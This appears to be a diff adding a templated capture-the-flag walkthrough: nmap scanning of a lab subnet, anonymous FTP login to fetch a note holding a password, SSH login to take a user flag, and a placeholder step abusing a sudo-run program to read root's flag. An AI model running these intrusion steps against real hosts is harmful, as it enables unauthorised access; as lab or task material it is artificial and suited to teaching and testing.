@@ -1,0 +1,19 @@
+## find the server and what it runs
+nmap -sn 10.10.11.0/24
+nmap -sV 10.10.11.20
+## anonymous FTP has a note with the password
+ftp 10.10.11.20
+anonymous
+guest
+cd pub
+get new-staff.txt
+bye
+cat new-staff.txt
+## sign in and take the user flag
+ssh -o StrictHostKeyChecking=accept-new {{USER}}@10.10.11.20
+{{PW1}}
+cat flag.txt
+## one program runs as root - abuse it to read root's flag
+sudo -l
+{{SUDORUN}}
+exit
